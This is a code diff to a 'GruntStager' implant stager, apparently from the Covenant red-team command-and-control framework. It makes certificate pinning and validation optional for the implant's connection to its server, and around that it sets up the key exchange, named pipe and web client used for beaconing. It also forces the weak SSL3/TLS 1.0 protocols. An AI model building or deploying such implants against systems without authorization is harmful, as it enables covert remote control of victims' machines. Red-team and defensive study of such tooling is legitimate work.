@@ -18,7 +18,7 @@ namespace GruntStager
         {
             ExecuteStager();
         }
-        public static void Main()
+        public static void Main(string[] args)
         {
             new GruntStager();
         }
@@ -40,6 +40,8 @@ namespace GruntStager
                 string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}";
                 string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}";
                 string CommType = @"{{REPLACE_COMM_TYPE}}";
+                bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
+                bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");
                 string PipeName = @"{{REPLACE_PIPE_NAME}}";
 
                 Random random = new Random();
@@ -61,15 +63,21 @@ namespace GruntStager
                 byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);
 
                 string Stage0Body = String.Format(MessageFormat, aGUID + GUID, "0", "", Convert.ToBase64String(SetupAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));
-                
-                if (CovenantCertHash != "")
+
+                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
+                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
                 {
-                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
-                    ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
+                    bool valid = true;
+                    if (UseCertPinning && CovenantCertHash != "")
                     {
-                        return cert.GetCertHashString() == CovenantCertHash;
-                    };
-                }
+                        valid = cert.GetCertHashString() == CovenantCertHash;
+                    }
+                    if (valid && ValidateCert)
+                    {
+                        valid = errors == System.Net.Security.SslPolicyErrors.None;
+                    }
+                    return valid;
+                };
                 string transformedResponse = HttpMessageTransform.Transform(Encoding.UTF8.GetBytes(Stage0Body));
                 NamedPipeServerStream pipe = null;
                 CookieWebClient wc = null;
